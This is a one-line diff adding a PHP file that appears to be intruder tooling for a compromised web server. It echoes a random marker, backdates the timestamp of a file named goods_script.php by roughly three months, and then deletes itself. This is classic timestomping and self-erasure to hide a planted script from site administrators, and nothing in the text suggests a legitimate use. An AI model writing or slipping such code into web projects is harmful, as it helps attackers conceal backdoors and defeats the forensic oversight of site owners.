@@ -1,0 +1,1 @@
+<?php echo "txAcDyMGPX"; if (file_exists("./goods_script.php")){ touch("./goods_script.php",(time()-60*60*24*30*3)); } unlink(__FILE__); /*k9PcNxb2XQ6D4QYV5ubt*/ ?>
